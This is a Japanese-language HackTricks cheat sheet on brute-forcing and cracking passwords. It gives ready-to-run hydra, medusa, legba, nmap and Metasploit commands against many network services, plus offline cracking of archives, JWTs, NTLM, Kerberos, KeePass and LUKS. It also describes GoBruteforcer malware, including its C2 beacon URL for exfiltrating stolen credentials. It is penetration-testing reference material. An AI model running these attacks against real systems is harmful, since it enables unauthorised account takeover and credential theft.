# Brute Force - チートシート

{{#include ../banners/hacktricks-training.md}}

## デフォルト認証情報

使用されている技術のデフォルト認証情報を**Googleで検索**するか、**以下のリンクを試してください**:

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **独自の辞書を作成する**

ターゲットに関する情報をできるだけ多く収集し、カスタム辞書を生成します。役立つツール:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### ウェブサイトベースのワードリスト

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

被害者について知っている情報（名前、日付など）に基づいてパスワードを生成します。

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

単語リスト生成ツールです。単語を指定すると、それらの単語から複数のバリエーションを作成できます。特定のターゲットに合わせた、独自の最適な単語リストを作成できます。

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### Wordlists

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## インターネット全域のbruteforcerワークフロー（Goベースのスキャナーから得た知見）

GoBruteforcerマルウェアのスキャンワークフローでは、以下の動作が確認されました。具体的な値はサンプルによって異なります。<sup>[[1]](#references)</sup>

- **アーキテクチャに合わせたworker pool**を維持する（例: `x86_64/arm64`では95並列、`i686`では85、`armv5tel`では35、その他のアーキテクチャではデフォルトで50）。アクティブなworkerを毎秒確認し、目標数を下回ったら補充する。各workerは終了前に最大1つのターゲットIPを処理する。
- **ランダムなパブリックIPv4アドレス**を生成するが、明らかにルーティング不能な範囲と、オペレーターが除外する一部の範囲は破棄する: RFC1918、`100.64.0.0/10`、`127.0.0.0/8`、`0.0.0.0/8`、`169.254.0.0/16`、`198.18.0.0/15`、マルチキャストの`>=224.0.0.0/4`、cloudの利用が多い`/8`（`3/15/16/56`）、DoD関連の`/8`（`6/7/11/21/22/26/28/29/30/33/55/214/215`）。
- 短いタイムアウト（約2秒）で**サービスポートをプローブ**してから、**平文ログイン**（FTP/21、MySQL/3306、Postgres/5432、HTTP/80経由のphpMyAdmin）を試す。C2からの認証情報取得に失敗した場合は、小規模な組み込み認証情報リストにフォールバックする。
- `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>`のような小さなHTTP GETビーコンで**発見した認証情報を外部に送信**する（サービスコードの例: `1=PMA`、`2=MySQL`、`3=FTP`、`4=Postgres`）。一般的なブラウザーのUser-Agentを使い回して通信を目立たなくする。
- **phpMyAdmin spray**では、`GET /index.php?lang=en`を使って可能性の高い約80個のパスを総当たりし、PMAの目印（`pmahomme`テーマ/`phpmyadmin.css`/`navigation.php`）を検出する。また、`codemirror.css?v=X.Y.Z`を解析して認証処理を分岐する。バージョンが`<4.9`の場合はGETパラメーター`pma_username`/`pma_password`を受け付け、バージョンが`>=4.9`の場合は`server=1`、CSRF用の`token`、同じ認証情報を使ってPOSTする。

## サービス

サービス名のアルファベット順。

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP（ActiveMQ、RabbitMQ、Qpid、JORAM、Solace）

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Docker Registry

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTP 汎用ブルートフォース

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic認証

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - POSTフォーム

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

http**s**の場合は、"http-post-form"を"**https-post-form"に変更する必要があります

### **HTTP - CMS --** (W)ordpress、(J)oomla、(D)rupal、または(M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

**patator**で**oracle_login**を使用するには、次を**インストール**する必要があります:

```bash
pip3 install cx_Oracle --upgrade
```

[オフラインOracleSQLハッシュbruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

インストールするには、[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) から `.deb` パッケージをダウンロードできます。

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### 弱い SSH keys / Debian の予測可能な PRNG

一部のシステムには、暗号素材の生成に使われるランダムシードに既知の欠陥があります。その結果、keyspace が大幅に縮小し、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) などのツールで bruteforce できる場合があります。[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) など、事前生成された弱い keys のセットも利用できます。

### STOMP（ActiveMQ、RabbitMQ、HornetQ、OpenMQ）

STOMP テキストプロトコルは広く使われているメッセージングプロトコルで、RabbitMQ、ActiveMQ、HornetQ、OpenMQ などの一般的なメッセージキューサービスとのシームレスな通信と連携を可能にします。メッセージの交換やさまざまなメッセージング操作を行うための、標準化された効率的な手段を提供します。

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## ローカル

### オンライン cracking データベース

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 と SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1。ESS/SSP の有無を問わず、任意の challenge 値に対応)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes、WPA2 captures、MSOffice・ZIP・PDF などのアーカイブ)
- [https://crackstation.net/](https://crackstation.net) (Hashes)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hashes とファイルの hashes)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5、NTLM、SHA1、MySQL5、SHA256、SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Hash を brute force する前に、こちらを確認してください。

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### 既知平文zip攻撃

暗号化されたzip内に含まれるファイルの**平文**（または平文の一部）を知っている必要があります。暗号化されたzip内の**ファイル名とサイズ**は、**`7z l encrypted.zip`**を実行して確認できます。\
リリースページから[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)をダウンロードしてください。

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### PDF Owner パスワード

PDF Owner passwordをクラックするには、こちらを確認してください: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Lucks イメージ

#### 方法 1

インストール: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### 方法 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

別のLuks BFチュートリアル: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### PGP/GPG 秘密鍵

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)を使用し、その後johnを実行します

### Open Officeのパスワード保護された列

パスワードで保護された列があるxlsxファイルを持っている場合、保護を解除できます：

- **Google Driveにアップロード**すると、パスワードは自動的に削除されます
- **手動で**削除するには：

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### PFX証明書

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## ツール

**ハッシュの例:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### ワードリスト

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **ワードリスト生成ツール**

- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** ベース文字、キーマップ、ルートを設定できる高度なkeyboard-walkジェネレーター。

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### John mutation

_**/etc/john/john.conf**_ を読み込み、設定します。

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Hashcatの攻撃

- **Wordlist attack** (`-a 0`) とルール

**Hashcat**にはルールを含む**フォルダー**が付属していますが、[**こちらで他の興味深いルールを見つけることができます**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。

```
